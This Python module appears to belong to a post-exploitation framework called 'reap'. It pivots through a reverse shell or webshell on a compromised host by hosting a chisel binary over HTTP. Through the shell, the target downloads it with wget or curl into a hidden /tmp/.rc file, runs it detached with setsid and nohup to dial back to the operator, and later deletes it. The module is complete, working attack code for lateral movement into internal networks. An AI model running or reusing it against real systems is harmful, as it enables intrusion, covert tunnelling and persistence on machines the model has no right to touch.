"""Reverse port-forwarding through an exec-only shell, via chisel.

A raw reverse/bind shell (or a webshell) is a single command channel — it can't
multiplex TCP streams the way SSH's direct-tcpip can, so reap can't tunnel through
it in-process. Instead it orchestrates chisel: a server on the operator host and a
reverse client run on the target *through the shell*. The target dials back out to
the operator (firewall-friendly, the same path the reverse shell used), and the
operator host gains a local port onto the target's internal service.

Result: 127.0.0.1:<local_port> (operator) -> <remote_host>:<remote_port> (target).

Requirements (the operator's job to satisfy):
  - a chisel binary on the operator host — `REAP_CHISEL=/path`, or on PATH;
  - `wget` or `curl` on the target;
  - the target must be able to reach the operator (as your reverse shell already did).
Set `REAP_LHOST` if reap can't infer the address the target should call back on.

CONSTRAINT: reap never initiates access. This only reaches services reachable from
a foothold the operator already holds — it is pivoting over existing access.
"""
from __future__ import annotations

import functools
import http.server
import os
import socket
import subprocess
import threading
import time
from pathlib import Path
from shutil import which
from typing import Optional


def resolve_chisel() -> Optional[str]:
    """Find a chisel binary on the operator host (REAP_CHISEL, then PATH, then
    common locations). Returns None if absent."""
    env = os.environ.get("REAP_CHISEL")
    if env and Path(env).exists():
        return env
    found = which("chisel")
    if found:
        return found
    for cand in ("/usr/bin/chisel", "/usr/local/bin/chisel",
                 "/opt/chisel/chisel", "/opt/chisel"):
        if Path(cand).exists():
            return cand
    return None


class _QuietHTTP(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):  # pragma: no cover - silence request logging
        pass


class ChiselForward:
    """Stand up a chisel reverse tunnel over an exec-only session. Exposes the same
    surface as transport.forward.LocalForward (local_port / is_alive / stop) so the
    console treats both the same."""

    def __init__(self, session, remote_host: str, remote_port: int,
                 local_port: int = 0, lhost: Optional[str] = None,
                 chisel: Optional[str] = None, timeout: int = 25):
        self.session = session
        self.remote_host = remote_host
        self.remote_port = int(remote_port)
        self.lhost = (lhost or os.environ.get("REAP_LHOST")
                      or getattr(session, "local_addr", None))
        if not self.lhost:
            raise RuntimeError(
                "can't infer the address the target should call back on — set REAP_LHOST")
        self.chisel = chisel or resolve_chisel()
        if not self.chisel:
            raise RuntimeError(
                "chisel not found on this host — install it or set REAP_CHISEL=/path/to/chisel")
        self.local_port = int(local_port) or self._free_port()
        self._server_port = self._free_port()
        self._http_port = self._free_port()
        self._procs: list[subprocess.Popen] = []
        self._httpd: Optional[http.server.ThreadingHTTPServer] = None
        self._remote_bin = "/tmp/.rc"
        self._start(timeout)

    @staticmethod
    def _free_port() -> int:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    @staticmethod
    def _port_open(host: str, port: int) -> bool:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            return False

    def _start(self, timeout: int) -> None:
        chisel_dir = str(Path(self.chisel).resolve().parent)
        chisel_name = Path(self.chisel).name

        # 1. serve the chisel binary so the target can fetch it
        handler = functools.partial(_QuietHTTP, directory=chisel_dir)
        self._httpd = http.server.ThreadingHTTPServer(("0.0.0.0", self._http_port), handler)
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()

        # 2. chisel server (reverse) on the operator host
        self._procs.append(subprocess.Popen(
            [self.chisel, "server", "--reverse", "--host", "0.0.0.0",
             "--port", str(self._server_port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        time.sleep(1.0)  # let the server bind

        # 3. on the target: pull chisel, then run the reverse client, backgrounded
        url = f"http://{self.lhost}:{self._http_port}/{chisel_name}"
        self.session.exec(
            f"command -v wget >/dev/null 2>&1 && wget -q {url} -O {self._remote_bin} "
            f"|| curl -s {url} -o {self._remote_bin}", timeout=timeout)
        self.session.exec(f"chmod +x {self._remote_bin}", timeout=10)
        client = (f"{self._remote_bin} client {self.lhost}:{self._server_port} "
                  f"R:127.0.0.1:{self.local_port}:{self.remote_host}:{self.remote_port}")
        self.session.exec(f"setsid {client} >/dev/null 2>&1 & "
                          f"nohup {client} >/dev/null 2>&1 &", timeout=10)

        # 4. wait for the tunnel to come up (operator-side local port accepts)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self._port_open("127.0.0.1", self.local_port):
                return
            time.sleep(0.5)
        self.stop()
        raise RuntimeError(
            f"chisel tunnel did not come up on 127.0.0.1:{self.local_port} within {timeout}s "
            f"— check chisel is on the target, that it can reach {self.lhost}, and the arch matches")

    def is_alive(self) -> bool:
        return (any(p.poll() is None for p in self._procs)
                and self._port_open("127.0.0.1", self.local_port))

    def stop(self) -> None:
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass
        if self._httpd:
            try:
                self._httpd.shutdown()
            except Exception:
                pass
        try:
            self.session.exec(f"pkill -f {self._remote_bin} 2>/dev/null; "
                              f"rm -f {self._remote_bin}", timeout=10)
        except Exception:
            pass

    def __repr__(self) -> str:  # pragma: no cover - cosmetic
        return (f"<ChiselForward 127.0.0.1:{self.local_port} -> "
                f"{self.remote_host}:{self.remote_port} via chisel>")
